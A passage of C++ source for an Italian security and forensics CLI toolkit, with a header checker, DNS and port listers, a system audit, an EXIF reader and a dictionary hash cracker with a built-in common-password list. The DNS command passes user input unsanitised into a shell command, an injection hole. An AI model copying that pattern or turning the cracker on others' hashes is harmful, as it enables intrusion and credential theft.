    std::cout<<Color::YELLOW<<"  Adler-32: "<<Color::GREEN<<std::hex<<std::uppercase<<std::setw(8)<<std::setfill('0')<<adler<<std::dec<<Color::RESET<<"\n";
    std::cout<<Color::YELLOW<<"  MD5     : "<<Color::GREEN<<MD5::hashFile(args[1])<<Color::RESET<<"\n";
    std::cout<<Color::YELLOW<<"  SHA-256 : "<<Color::GREEN<<SHA256::hashFile(args[1])<<Color::RESET<<"\n\n";
}

// ═══════════════════════════════════════════════════════════════
//  HEADERS — analisi security headers HTTP
// ═══════════════════════════════════════════════════════════════
void cmdSecHeaders(const std::vector<std::string>& args) {
    if(args.size()<2){std::cout<<Color::YELLOW<<"Uso: secheaders <host> [porta]\n"<<Color::RESET;return;}
    std::string host=args[1];
    std::string port=(args.size()>=3)?args[2]:"80";

    struct addrinfo hints{},*res=nullptr;
    hints.ai_family=AF_UNSPEC; hints.ai_socktype=SOCK_STREAM;
    if(getaddrinfo(host.c_str(),port.c_str(),&hints,&res)!=0){
        std::cout<<Color::RED<<"  Impossibile risolvere host.\n"<<Color::RESET;return;
    }
    int sock=socket(res->ai_family,res->ai_socktype,res->ai_protocol);
    struct timeval tv{5,0};
    setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv));
    setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));
    if(connect(sock,res->ai_addr,res->ai_addrlen)!=0){
        close(sock);freeaddrinfo(res);
        std::cout<<Color::RED<<"  Connessione fallita.\n"<<Color::RESET;return;
    }
    freeaddrinfo(res);
    std::string req="GET / HTTP/1.0\r\nHost: "+host+"\r\nConnection: close\r\n\r\n";
    send(sock,req.c_str(),req.size(),0);
    std::string resp; char buf[4096]; ssize_t n;
    while((n=recv(sock,buf,sizeof(buf)-1,0))>0){buf[n]=0;resp+=buf;if(resp.find("\r\n\r\n")!=std::string::npos)break;}
    close(sock);

    // Estrai headers
    std::map<std::string,std::string> hdrs;
    std::istringstream ss(resp); std::string hl;
    while(std::getline(ss,hl)){
        hl=trim(hl); if(hl.empty()) break;
        auto c=hl.find(':'); if(c==std::string::npos) continue;
        std::string k=trim(hl.substr(0,c)); std::string v=trim(hl.substr(c+1));
        hdrs[toLower(k)]=v;
    }

    struct SecCheck { std::string header; std::string desc; std::string recommendation; };
    std::vector<SecCheck> checks = {
        {"strict-transport-security","HSTS","Aggiungi: max-age=31536000; includeSubDomains"},
        {"content-security-policy","CSP","Definisce sorgenti consentite per risorse"},
        {"x-frame-options","Clickjacking","Aggiungi: DENY o SAMEORIGIN"},
        {"x-content-type-options","MIME sniffing","Aggiungi: nosniff"},
        {"x-xss-protection","XSS Filter","Aggiungi: 1; mode=block"},
        {"referrer-policy","Referrer leak","Aggiungi: no-referrer o strict-origin"},
        {"permissions-policy","Feature Policy","Limita API browser (camera, mic, ...)"},
        {"cache-control","Cache control","Aggiungi: no-store per dati sensibili"},
        {"x-powered-by","Tech disclosure","Rimuovi: rivela stack tecnologico"},
        {"server","Server info","Rimuovi/oscura: rivela versione server"},
    };

    std::cout<<Color::CYAN<<"\n  🛡  SECURITY HEADERS: "<<host<<":"<<port<<"\n"<<Color::RESET;
    std::cout<<Color::DIM<<"  "<<std::string(65,'-')<<"\n"<<Color::RESET;
    int score=0;
    for(auto& chk:checks){
        bool present=hdrs.count(chk.header)>0;
        bool dangerous=(chk.header=="x-powered-by"||chk.header=="server");
        bool ok=(present && !dangerous)||(!present && dangerous);
        if(ok) score++;
        std::string status=ok?Color::BGREEN+"  ✅ ":Color::BRED+"  ❌ ";
        std::cout<<status<<Color::YELLOW<<std::left<<std::setw(30)<<chk.header<<Color::RESET;
        if(present) std::cout<<Color::DIM<<" "<<hdrs[chk.header].substr(0,40)<<Color::RESET;
        else std::cout<<Color::DIM<<" (assente)"<<Color::RESET;
        std::cout<<"\n";
        if(!ok) std::cout<<Color::DIM<<"       → "<<chk.recommendation<<Color::RESET<<"\n";
    }
    int pct=score*100/(int)checks.size();
    std::string grade; std::string col;
    if(pct>=80){grade="A";col=Color::BGREEN;}
    else if(pct>=60){grade="B";col=Color::GREEN;}
    else if(pct>=40){grade="C";col=Color::YELLOW;}
    else if(pct>=20){grade="D";col=Color::BRED;}
    else{grade="F";col=Color::BG_RED+Color::BWHITE;}
    std::cout<<Color::DIM<<"  "<<std::string(65,'-')<<"\n"<<Color::RESET;
    std::cout<<Color::YELLOW<<"  Score: "<<Color::WHITE<<score<<"/"<<checks.size()
             <<" ("<<pct<<"%)  Grade: "<<col<<" "<<grade<<" "<<Color::RESET<<"\n\n";
}

// ═══════════════════════════════════════════════════════════════
//  ARPSCAN — scansione ARP locale (via arp -a)
// ═══════════════════════════════════════════════════════════════
void cmdArpScan(const std::vector<std::string>& args) {
    std::cout<<Color::CYAN<<"\n  📡 ARP SCAN — HOST LOCALI\n"<<Color::RESET;
    std::cout<<Color::DIM<<"  "<<std::string(55,'-')<<"\n"<<Color::RESET;
    FILE* p=popen("arp -a 2>&1","r");
    if(!p){std::cout<<Color::RED<<"  Comando arp non disponibile.\n"<<Color::RESET;return;}
    char buf[256];
    while(fgets(buf,sizeof(buf),p)){
        std::string l(buf);
        if(l.find("incomplete")!=std::string::npos) std::cout<<Color::DIM;
        else std::cout<<Color::GREEN;
        std::cout<<"  "<<l<<Color::RESET;
    }
    pclose(p);
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  OPENPORTS — porte in ascolto locali
// ═══════════════════════════════════════════════════════════════
void cmdOpenPorts(const std::vector<std::string>& args) {
    std::cout<<Color::CYAN<<"\n  🔓 PORTE IN ASCOLTO LOCALI\n"<<Color::RESET;
    std::cout<<Color::DIM<<"  "<<std::string(60,'-')<<"\n"<<Color::RESET;
    std::string cmd;
#ifdef __APPLE__
    cmd = "netstat -anp tcp 2>&1 | grep LISTEN";
#else
    cmd = "ss -tlnp 2>&1 || netstat -tlnp 2>&1";
#endif
    FILE* p=popen(cmd.c_str(),"r"); if(!p) return;
    char buf[512]; bool head=true;
    while(fgets(buf,sizeof(buf),p)){
        std::string l(buf);
        if(head){std::cout<<Color::BYELLOW<<"  "<<l<<Color::RESET;head=false;continue;}
        std::cout<<Color::GREEN<<"  "<<l<<Color::RESET;
    }
    pclose(p);
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  DNSALL — tutti i record DNS (A, AAAA, MX, NS, TXT, CNAME)
// ═══════════════════════════════════════════════════════════════
void cmdDnsAll(const std::vector<std::string>& args) {
    if(args.size()<2){std::cout<<Color::YELLOW<<"Uso: dnsall <dominio>\n"<<Color::RESET;return;}
    std::string dom=args[1];
    std::cout<<Color::CYAN<<"\n  🌐 DNS FULL RECORD: "<<Color::WHITE<<dom<<"\n"<<Color::RESET;
    std::cout<<Color::DIM<<"  "<<std::string(60,'-')<<"\n"<<Color::RESET;

    std::vector<std::pair<std::string,std::string>> queries={
        {"A","dig +short A "+dom+" 2>&1"},
        {"AAAA","dig +short AAAA "+dom+" 2>&1"},
        {"MX","dig +short MX "+dom+" 2>&1"},
        {"NS","dig +short NS "+dom+" 2>&1"},
        {"TXT","dig +short TXT "+dom+" 2>&1"},
        {"CNAME","dig +short CNAME "+dom+" 2>&1"},
        {"SOA","dig +short SOA "+dom+" 2>&1"},
    };
    for(auto& q:queries){
        FILE* p=popen(q.second.c_str(),"r");
        if(!p) continue;
        char buf[512]; std::string out;
        while(fgets(buf,sizeof(buf),p)) out+=buf;
        pclose(p);
        out=trim(out);
        if(!out.empty()){
            std::cout<<Color::YELLOW<<"  "<<std::left<<std::setw(6)<<q.first<<Color::GREEN<<" "<<out<<Color::RESET<<"\n";
        }
    }
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  HASH CRACK — verifica hash vs wordlist
// ═══════════════════════════════════════════════════════════════
void cmdHashCrack(const std::vector<std::string>& args) {
    if(args.size()<3){
        std::cout<<Color::YELLOW<<"Uso: hashcrack <hash> <wordlist_file>\n"
                 <<"     hashcrack <hash> --common\n"<<Color::RESET;return;
    }
    std::string targetHash=toLower(args[1]);
    bool useCommon=(args[2]=="--common");

    std::vector<std::string> words;
    if(useCommon){
        words={"password","123456","qwerty","admin","letmein","welcome","monkey","dragon",
               "master","password123","1234567890","abc123","111111","12345678","sunshine",
               "princess","shadow","superman","michael","football","iloveyou","trustno1",
               "passwd","root","toor","test","guest","hello","login","changeme","secret"};
    } else {
        std::ifstream wf(args[2]);
        if(!wf){std::cout<<Color::RED<<"Wordlist non trovata.\n"<<Color::RESET;return;}
        std::string w; while(std::getline(wf,w)){w=trim(w);if(!w.empty())words.push_back(w);}
    }

    std::cout<<Color::CYAN<<"\n  🔨 HASH CRACKER\n"<<Color::RESET;
    std::cout<<Color::YELLOW<<"  Target: "<<Color::WHITE<<targetHash<<"\n";
    std::cout<<Color::YELLOW<<"  Parole: "<<Color::WHITE<<words.size()<<"\n"<<Color::RESET;
    std::cout<<Color::DIM<<"  "<<std::string(55,'-')<<"\n"<<Color::RESET;

    size_t len=targetHash.size();
    for(auto& w:words){
        std::string h;
        if(len==32) h=toLower(MD5::hashFile("")); // placeholder
        // Calcola hash in memoria della parola
        {
            if(len==32){
                MD5 m; m.update((uint8_t*)w.c_str(),w.size()); h=m.digest();
            } else if(len==64){
                SHA256 s; s.update((uint8_t*)w.c_str(),w.size()); h=s.digest();
            }
        }
        if(h==targetHash){
            std::cout<<Color::BGREEN<<"  ✅ TROVATO! "<<Color::WHITE<<"hash("<<Color::GREEN<<w<<Color::WHITE<<") = "<<Color::YELLOW<<targetHash<<Color::RESET<<"\n\n";
            return;
        }
    }
    std::cout<<Color::RED<<"  ❌ Non trovato nella wordlist ("<<words.size()<<" tentativi).\n"<<Color::RESET<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  PERMCHECK — analisi permessi SUID/SGID/world-writable
// ═══════════════════════════════════════════════════════════════
void cmdPermCheck(const std::vector<std::string>& args) {
    if(args.size()<2){std::cout<<Color::YELLOW<<"Uso: permcheck <dir> [--suid|--sgid|--world|--all]\n"<<Color::RESET;return;}
    std::string dir=args[1];
    bool chkSuid=true,chkSgid=true,chkWorld=true;
    if(args.size()>=3){
        chkSuid=(args[2]=="--suid"||args[2]=="--all");
        chkSgid=(args[2]=="--sgid"||args[2]=="--all");
        chkWorld=(args[2]=="--world"||args[2]=="--all");
        if(args[2]=="--all"){chkSuid=chkSgid=chkWorld=true;}
    }
    std::cout<<Color::CYAN<<"\n  🔍 PERMCHECK: "<<dir<<"\n"<<Color::RESET;
    std::cout<<Color::DIM<<"  "<<std::string(65,'-')<<"\n"<<Color::RESET;

    std::vector<FileEntry> all; scanDir(dir,all,"",true);
    int found=0;
    for(auto& fe:all){
        bool isSuid=fe.mode&S_ISUID;
        bool isSgid=fe.mode&S_ISGID;
        bool isWW  =(fe.mode&S_IWOTH);
        if((chkSuid&&isSuid)||(chkSgid&&isSgid)||(chkWorld&&isWW)){
            found++;
            std::string flags="";
            if(isSuid) flags+=Color::BRED+" [SUID]";
            if(isSgid) flags+=Color::YELLOW+" [SGID]";
            if(isWW)   flags+=Color::MAGENTA+" [WORLD-WRITABLE]";
            std::cout<<Color::WHITE<<"  "<<fe.path<<flags<<Color::RESET<<"\n";
            std::cout<<Color::DIM<<"    permessi: "<<permString(fe.mode)<<Color::RESET<<"\n";
        }
    }
    if(found==0) std::cout<<Color::GREEN<<"  Nessun file sospetto trovato.\n"<<Color::RESET;
    else std::cout<<Color::YELLOW<<"\n  File sospetti: "<<found<<Color::RESET<<"\n";
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  FILEHIDE — cerca file nascosti e dot-files
// ═══════════════════════════════════════════════════════════════
void cmdFileHide(const std::vector<std::string>& args) {
    if(args.size()<2){std::cout<<Color::YELLOW<<"Uso: filehide <dir>\n"<<Color::RESET;return;}
    std::string dir=args[1];
    std::cout<<Color::CYAN<<"\n  👁  FILE NASCOSTI: "<<dir<<"\n"<<Color::RESET;
    std::cout<<Color::DIM<<"  "<<std::string(60,'-')<<"\n"<<Color::RESET;

    std::function<void(const std::string&,int)> walk=[&](const std::string& d,int depth){
        if(depth>5) return;
        DIR* dp=opendir(d.c_str()); if(!dp) return;
        struct dirent* ent;
        while((ent=readdir(dp))!=nullptr){
            std::string name=ent->d_name;
            if(name=="."||name=="..") continue;
            std::string full=d+"/"+name;
            struct stat st; if(stat(full.c_str(),&st)!=0) continue;
            if(name[0]=='.'){
                std::cout<<Color::YELLOW<<"  "<<full<<Color::RESET;
                if(S_ISDIR(st.st_mode)) std::cout<<Color::DIM<<" [dir]"<<Color::RESET;
                else std::cout<<Color::DIM<<" ("<<humanSize(st.st_size)<<")"<<Color::RESET;
                std::cout<<"\n";
            }
            if(S_ISDIR(st.st_mode)) walk(full,depth+1);
        }
        closedir(dp);
    };
    walk(dir,0);
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  ENCODE avanzato — aggiunge binary e altri
// ═══════════════════════════════════════════════════════════════
void cmdEncodeExtra(const std::vector<std::string>& args) {
    if(args.size()<3){
        std::cout<<Color::YELLOW<<"Uso: enc <tipo> <testo>\n"
                 <<"  Tipi: bin, hex, octal, decimal, html, unicode\n"<<Color::RESET;return;
    }
    std::string type=toLower(args[1]),input;
    for(size_t i=2;i<args.size();i++){if(i>2)input+=' ';input+=args[i];}
    std::cout<<Color::CYAN<<"\n  🔡 ENCODE ["<<type<<"]\n"<<Color::RESET;
    std::cout<<Color::DIM<<"  "<<std::string(50,'-')<<"\n"<<Color::RESET;
    std::cout<<Color::YELLOW<<"  Input : "<<Color::WHITE<<input<<"\n";

    std::string out;
    if(type=="bin"){
        for(char c:input){for(int b=7;b>=0;b--)out+=(char)(((c>>b)&1)?'1':'0');out+=' ';}
    } else if(type=="octal"){
        std::ostringstream os;
        for(char c:input) os<<"\\"<<std::oct<<(int)(uint8_t)c;
        out=os.str();
    } else if(type=="decimal"){
        for(size_t i=0;i<input.size();i++){if(i)out+=",";out+=std::to_string((uint8_t)input[i]);}
    } else if(type=="html"){
        for(char c:input){
            if(c=='<') out+="&lt;";
            else if(c=='>') out+="&gt;";
            else if(c=='&') out+="&amp;";
            else if(c=='"') out+="&quot;";
            else if(c=='\'') out+="&#x27;";
            else out+=c;
        }
    } else if(type=="unicode"){
        for(char c:input){std::ostringstream os;os<<"\\u"<<std::hex<<std::setw(4)<<std::setfill('0')<<(int)(uint8_t)c;out+=os.str();}
    } else if(type=="hex"){
        std::ostringstream os;
        for(char c:input) os<<"\\x"<<std::hex<<std::setw(2)<<std::setfill('0')<<(int)(uint8_t)c;
        out=os.str();
    } else { std::cout<<Color::RED<<"  Tipo non riconosciuto.\n"<<Color::RESET;return; }
    std::cout<<Color::YELLOW<<"  Output: "<<Color::GREEN<<out<<Color::RESET<<"\n\n";
}

// ═══════════════════════════════════════════════════════════════
//  TIMESTAMP — conversione timestamp UNIX
// ═══════════════════════════════════════════════════════════════
void cmdTimestamp(const std::vector<std::string>& args) {
    std::cout<<Color::CYAN<<"\n  ⏱  TIMESTAMP\n"<<Color::RESET;
    std::cout<<Color::DIM<<"  "<<std::string(50,'-')<<"\n"<<Color::RESET;
    time_t now=time(nullptr);
    if(args.size()>=2){
        try{
            time_t ts=std::stoll(args[1]);
            std::cout<<Color::YELLOW<<"  Unix    : "<<Color::WHITE<<ts<<"\n";
            std::cout<<Color::YELLOW<<"  UTC     : "<<Color::WHITE<<timeStr(ts)<<"\n";
            struct tm* local=localtime(&ts);
            char buf[64]; strftime(buf,sizeof(buf),"%A %d %B %Y %H:%M:%S",local);
            std::cout<<Color::YELLOW<<"  Locale  : "<<Color::WHITE<<buf<<"\n";
        } catch(...){
            std::cout<<Color::RED<<"  Timestamp non valido.\n"<<Color::RESET;
        }
    } else {
        std::cout<<Color::YELLOW<<"  Adesso  : "<<Color::WHITE<<now<<"\n";
        std::cout<<Color::YELLOW<<"  UTC     : "<<Color::WHITE<<timeStr(now)<<"\n";
        std::cout<<Color::YELLOW<<"  Epoch   : "<<Color::WHITE<<"1970-01-01 00:00:00 UTC\n";
    }
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  RANDGEN — generatore dati casuali sicuri
// ═══════════════════════════════════════════════════════════════
void cmdRandGen(const std::vector<std::string>& args) {
    std::string type=(args.size()>=2)?toLower(args[1]):"password";
    int length=(args.size()>=3)?std::stoi(args[2]):16;
    if(length>256) length=256;

    std::cout<<Color::CYAN<<"\n  🎲 RANDOM GENERATOR ["<<type<<"]\n"<<Color::RESET;
    std::cout<<Color::DIM<<"  "<<std::string(50,'-')<<"\n"<<Color::RESET;

    // Leggi da /dev/urandom
    std::ifstream rng("/dev/urandom",std::ios::binary);
    if(!rng){std::cout<<Color::RED<<"  /dev/urandom non disponibile.\n"<<Color::RESET;return;}

    auto randByte=[&]()->uint8_t{char c;rng.get(c);return (uint8_t)c;};

    if(type=="password"){
        std::string chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?";
        std::string pass;
        for(int i=0;i<length;i++) pass+=chars[randByte()%chars.size()];
        std::cout<<Color::YELLOW<<"  Password: "<<Color::GREEN<<pass<<Color::RESET<<"\n";
    } else if(type=="hex"){
        std::cout<<Color::YELLOW<<"  Hex: "<<Color::GREEN;
        for(int i=0;i<length;i++) std::cout<<std::hex<<std::setw(2)<<std::setfill('0')<<(int)randByte();
        std::cout<<Color::RESET<<"\n";
    } else if(type=="uuid"){
        uint8_t u[16]; for(int i=0;i<16;i++) u[i]=randByte();
        u[6]=(u[6]&0x0f)|0x40; u[8]=(u[8]&0x3f)|0x80;
        std::ostringstream os;
        os<<std::hex<<std::setfill('0');
        for(int i=0;i<16;i++){
            if(i==4||i==6||i==8||i==10) os<<'-';
            os<<std::setw(2)<<(int)u[i];
        }
        std::cout<<Color::YELLOW<<"  UUID: "<<Color::GREEN<<os.str()<<Color::RESET<<"\n";
    } else if(type=="pin"){
        std::string pin;
        for(int i=0;i<length;i++) pin+=(char)('0'+randByte()%10);
        std::cout<<Color::YELLOW<<"  PIN: "<<Color::GREEN<<pin<<Color::RESET<<"\n";
    } else if(type=="b64"){
        std::string raw;
        for(int i=0;i<length;i++) raw+=(char)randByte();
        std::cout<<Color::YELLOW<<"  Base64: "<<Color::GREEN<<base64Encode(raw)<<Color::RESET<<"\n";
    }
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  SYSAUDIT — audit sicurezza sistema locale
// ═══════════════════════════════════════════════════════════════
void cmdSysAudit(const std::vector<std::string>& args) {
    std::cout<<Color::CYAN<<"\n  🔐 SYSTEM SECURITY AUDIT\n"<<Color::RESET;
    std::cout<<Color::DIM<<"  "<<std::string(65,'-')<<"\n"<<Color::RESET;

    struct AuditCheck { std::string name; std::string cmd; std::string goodPattern; bool invertMatch; };
    auto check=[](const std::string& name, bool ok, const std::string& note){
        std::cout<<(ok?Color::BGREEN+"  ✅ ":Color::BRED+"  ⚠️  ")
                 <<Color::WHITE<<std::left<<std::setw(35)<<name
                 <<Color::DIM<<note<<Color::RESET<<"\n";
    };

    // Root check
    check("Eseguito come root", getuid()==0, getuid()==0?"(attenzione!)":"(ok, utente normale)");

    // File /etc/passwd world-readable
    struct stat st;
    if(stat("/etc/passwd",&st)==0) check("/etc/passwd world-readable",(st.st_mode&S_IROTH)==0,"dovrebbe essere 644");
    if(stat("/etc/shadow",&st)==0) check("/etc/shadow protetto",(st.st_mode&(S_IRGRP|S_IROTH))==0,"dovrebbe essere 640 o 600");

    // SSH
    if(stat("/etc/ssh/sshd_config",&st)==0){
        std::ifstream ssh("/etc/ssh/sshd_config");
        std::string content,l;
        while(std::getline(ssh,l)) content+=l+"\n";
        check("SSH: PermitRootLogin no",   content.find("PermitRootLogin no")!=std::string::npos,"");
        check("SSH: PasswordAuth off",     content.find("PasswordAuthentication no")!=std::string::npos,"usa chiavi SSH");
        check("SSH: Protocol 2",           content.find("Protocol 1")==std::string::npos,"Protocol 1 è obsoleto");
    }

    // Firewall
    FILE* ufw=popen("ufw status 2>/dev/null | head -1","r");
    if(ufw){char b[128]={0};fgets(b,sizeof(b),ufw);pclose(ufw);
        std::string r(b);
        check("Firewall (ufw)",r.find("active")!=std::string::npos,"");}
    else{
        FILE* iptbl=popen("iptables -L 2>/dev/null | wc -l","r");
        if(iptbl){char b[32]={0};fgets(b,sizeof(b),iptbl);pclose(iptbl);
            check("Firewall (iptables)",std::stoi(b)>8,"");}
    }

    // /tmp sticky bit
    if(stat("/tmp",&st)==0) check("/tmp sticky bit",(st.st_mode&S_ISVTX)!=0,"");

    // Utenti con UID 0
    std::ifstream passwd("/etc/passwd");
    std::string pl; int rootUsers=0;
    while(std::getline(passwd,pl)){
        auto t=split(pl,':');
        if(t.size()>2&&t[2]=="0") rootUsers++;
    }
    check("Un solo utente UID=0",rootUsers==1,"UID=0: "+std::to_string(rootUsers));

    std::cout<<Color::DIM<<"\n  Nota: audit locale senza accesso root potrebbe essere incompleto.\n"<<Color::RESET<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  EXIFREAD — leggi metadati EXIF da JPEG (senza librerie)
// ═══════════════════════════════════════════════════════════════
void cmdExif(const std::vector<std::string>& args) {
    if(args.size()<2){std::cout<<Color::YELLOW<<"Uso: exif <file.jpg>\n"<<Color::RESET;return;}
    std::ifstream f(args[1],std::ios::binary);
    if(!f){std::cout<<Color::RED<<"File non trovato.\n"<<Color::RESET;return;}
    std::vector<uint8_t> data; char c; while(f.get(c)) data.push_back((uint8_t)c);

    std::cout<<Color::CYAN<<"\n  📸 EXIF METADATA: "<<args[1]<<"\n"<<Color::RESET;
    std::cout<<Color::DIM<<"  "<<std::string(55,'-')<<"\n"<<Color::RESET;

    // Cerca APP1 marker (0xFFE1)
    bool found=false;
    for(size_t i=0;i+3<data.size();i++){
        if(data[i]==0xFF&&data[i+1]==0xE1){
            found=true;
            size_t app1Len=((size_t)data[i+2]<<8)|data[i+3];
            std::cout<<Color::YELLOW<<"  APP1 marker @ offset 0x"<<std::hex<<i<<std::dec<<", len="<<app1Len<<"\n"<<Color::RESET;
            // Cerca Exif header
            if(i+10<data.size()&&data[i+4]=='E'&&data[i+5]=='x'&&data[i+6]=='i'&&data[i+7]=='f')
                std::cout<<Color::GREEN<<"  Exif header: presente\n"<<Color::RESET;
            break;
        }
    }
    if(!found) std::cout<<Color::DIM<<"  Nessun header EXIF (APP1) trovato.\n"<<Color::RESET;

    // Cerca stringhe leggibili di interesse EXIF
    std::vector<std::string> exifKeywords={"Canon","Nikon","Sony","Apple","Samsung","GPS","latitude","longitude",
        "DateTimeOriginal","Make","Model","Software","Copyright","Artist",
        "iPhone","Android","Pixel","Galaxy","OLYMPUS","FUJIFILM"};
    std::cout<<Color::YELLOW<<"\n  Stringhe EXIF rilevanti:\n"<<Color::RESET;
    std::string cur; bool anyFound=false;
    for(size_t i=0;i<data.size();i++){
        if(data[i]>=32&&data[i]<=126) cur+=(char)data[i];
        else { 
            if(cur.size()>=4){
                for(auto& kw:exifKeywords){
                    if(cur.find(kw)!=std::string::npos){
                        std::cout<<Color::WHITE<<"  0x"<<std::hex<<std::setw(6)<<i-cur.size()<<std::dec<<"  "<<Color::GREEN<<cur<<Color::RESET<<"\n";
                        anyFound=true; break;
                    }
                }
            }
            cur.clear();
        }
    }
    if(!anyFound) std::cout<<Color::DIM<<"  Nessuna stringa EXIF riconoscibile.\n"<<Color::RESET;
    std::cout<<"\n";
}



// ─────────────────────────────────────────────
//  CMD: help
// ─────────────────────────────────────────────
void cmdHelp() {
    std::cout << Color::CYAN << "\n  ╔══════════════════════════════════════════════════════════╗\n";
    std::cout << "  ║         COMANDI DISPONIBILI — NEXUS FORENSIC             ║\n";
    std::cout << "  ╠══════════════════════════════════════════════════════════╣\n" << Color::RESET;

    auto row = [](const std::string& cmd, const std::string& desc){
        std::cout << Color::CYAN << "  ║ " << Color::BYELLOW << std::left << std::setw(36) << cmd
                  << Color::WHITE << std::setw(22) << desc << Color::CYAN << " ║\n" << Color::RESET;
    };
    auto section = [](const std::string& title){
        std::cout << Color::CYAN << "  ╠══════════════════════════════════════════════════════════╣\n" << Color::RESET;
        std::cout << Color::CYAN << "  ║ " << Color::BRED << std::left << std::setw(57) << ("  ── " + title + " ──")
                  << Color::CYAN << "║\n" << Color::RESET;
        std::cout << Color::CYAN << "  ╠══════════════════════════════════════════════════════════╣\n" << Color::RESET;
    };

    section("ANALISI FILE & BINARI");
    row("hash <file> [md5|sha256|all]",  "Hash crittografici");
    row("fileinfo <file>",               "Metadati, permessi, timestamp");
    row("hexdump <file> [limit]",        "Dump esadecimale colorato");
    row("strings <file> [minlen] [pat]", "Estrai stringhe ASCII");
    row("grep <pattern> <file> [-i]",    "Cerca testo nel file");
    row("magic <file|dir>",              "Tipo tramite magic bytes");
    row("entropy <file>",                "Analisi entropia");
    row("binwalk <file>",                "Cerca firme embedded");
    row("carve <file> [--out <dir>]",    "File carving avanzato");
    row("checksum <file>",               "CRC32+Adler32+MD5+SHA256");
    row("exif <file.jpg>",               "Metadati EXIF");
    row("stego <file>",                  "Analisi steganografica");
    row("diff <file1> <file2>",          "Confronto testuale");
    row("compare <file1> <file2>",       "Confronto via hash");

    section("FORENSICA AVANZATA");
    row("freport <file> <caso> [--full]","Report forense professionale");
    row("custody new <f> <caso> <anal>", "Crea catena di custodia");
    row("custody add <caso> <azione>",   "Aggiungi evento alla catena");
    row("custody show <caso>",           "Mostra catena di custodia");
    row("custody verify <caso> <file>",  "Verifica integrita' evidenza");
    row("hashdb <file>",                 "Confronta hash con database");
    row("hashdb add <hash> <nome>",      "Aggiungi hash al database");
    row("diskimage <file.dd|.e01>",      "Analisi immagini disco");
    row("diskimage create <dev> <out>",  "Crea immagine disco (dd)");
    row("memory <dump.mem> [--all]",     "Analisi dump RAM");
    row("memory live",                   "Info RAM sistema corrente");
    row("registry <hivefile>",           "Analisi registry Windows");

    section("SISTEMA & FILESYSTEM");
    row("scan <dir> [-r] [-e .ext]",     "Scansiona directory");
    row("timeline <dir> [-r]",           "File per timestamp");
    row("filehide <dir>",                "Cerca file nascosti/dot-files");
    row("permcheck <dir> [--suid|...]",  "File SUID/SGID/world-writable");
    row("report <file> [output.txt]",    "Report forense completo");
    row("logcheck <file> [--auth]",      "Analisi log per anomalie");
    row("sysinfo",                       "Info sistema e variabili env");
    row("sysaudit",                      "Audit sicurezza sistema locale");
    row("processes [filtro]",            "Lista processi (ps aux)");
    row("openports",                     "Porte in ascolto locali");

    section("CRYPTO, ENCODING & CIPHER");
    row("decode <tipo> <stringa>",       "base64/hex/rot13/url");
    row("encode <tipo> <stringa>",       "base64/hex/morse/caesar/...");
    row("enc <tipo> <testo>",            "bin/octal/decimal/html/unicode");
    row("hashid <hash>",                 "Identifica tipo hash");
    row("hashcrack <hash> <wordlist>",   "Verifica hash vs wordlist");
    row("hashcrack <hash> --common",     "Hash vs password comuni");
    row("passcheck <password>",          "Robustezza password (7 criteri)");
    row("randgen [pass|hex|uuid|pin|b64]","Genera dati casuali sicuri");
    row("xor <key_hex> <file>",          "XOR decode con chiave");
    row("xor brute <file>",              "XOR brute-force 0x01-0xFF");
    row("jwt <token>",                   "Decodifica JWT + analisi");
    row("cipher caesar <shift> <testo>", "Cifrario Caesar");
    row("cipher brute <testo>",          "Caesar brute-force ROT1-25");
    row("cipher atbash <testo>",         "Cifrario Atbash");
    row("cipher vigenere <key> <testo>", "Cifrario Vigenere");
    row("cipher morse <testo>",          "Encode/decode Morse");
    row("freq <file|testo>",             "Analisi frequenza + IC");
    row("timestamp [unix]",              "Converti timestamp UNIX");

    section("RETE & RICOGNIZIONE");
    row("dns <hostname|ip>",             "DNS lookup + reverse");
    row("dnsall <dominio>",              "Tutti i record DNS (A,MX,NS,TXT...)");
    row("whois <dominio|ip>",            "WHOIS lookup");
    row("ping <host> [count]",           "ICMP ping");
    row("traceroute <host>",             "Traccia percorso di rete");
    row("myip",                          "IP pubblico e privato");
    row("geoip [ip]",                    "Geolocalizzazione IP");
    row("speedtest",                     "Test velocità connessione");
    row("monitor [n] [delay_ms]",        "Dashboard live CPU/RAM/disco/proc");
    row("portcheck <host> <p1> [p2..]",  "Verifica porte specifiche");
    row("portscan <host> <start> <end>", "Scansione range porte");
    row("httphead <host> [porta] [path]","HTTP headers response");
    row("secheaders <host> [porta]",     "Analisi security headers HTTP");
    row("banner <host> <porta>",         "Grab banner servizio TCP");
    row("hostinfo <host>",               "Info completa host");
    row("ssl <host> [porta]",            "Info SSL/TLS");
    row("subnet <ip/cidr>",              "Calcolatore subnet CIDR");
    row("macinfo <mac>",                 "Vendor da MAC address");
    row("urlparse <url>",                "Disseziona URL + pattern");
    row("netstat",                       "Connessioni attive (ss/netstat)");
    row("netcap <iface> [--filter ...]", "Cattura pacchetti live");
    row("netcap list",                   "Lista interfacce di rete");
    row("arpscan",                       "Host locali via ARP");

    section("GIT");
    row("git",                           "Tutti i comandi git (help)");
    row("git <subcomando> [args]",        "Esegue git reale con output");
    row("git init / clone / status",      "Setup e stato");
    row("git add / commit / push",        "Stage, commit, push");
    row("git branch / merge / rebase",    "Branch e merge");
    row("git log / diff / blame",         "Storia e diff");
    row("git stash / tag / worktree",     "Stash, tag, worktree");
    row("git bisect / fsck / gc",         "Debug e manutenzione");

    section("SECURITY REFERENCE & CTF");
    row("owasp",                          "OWASP Top 10 reference");
    row("cve <servizio>",                 "CVE noti per servizio");
    row("payload <tipo>",                 "Payload: xss/sqli/lfi/...");
    row("ctf <tipo>",                     "CTF toolkit e checklist");
    row("wordgen <tipo> <args>",          "Generatore wordlist");

    section("SHELL — COMANDI DI BASE");
